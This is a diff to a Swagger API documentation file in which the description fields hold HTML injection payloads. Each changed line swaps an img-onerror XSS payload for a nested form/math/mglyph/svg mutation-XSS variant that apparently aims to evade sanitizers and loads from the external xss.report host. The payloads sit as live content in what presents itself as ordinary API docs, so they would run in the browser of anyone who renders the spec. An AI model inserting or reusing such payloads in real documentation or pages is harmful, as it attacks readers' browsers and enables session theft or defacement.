@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-   <img onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
+   <form><math><mtext></form><form><mglyph><svg><mtext><img onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <img src='https://xss.report/c/santik86' onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><img src='https://xss.report/c/santik86' onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
 
           format: int64
           in: path
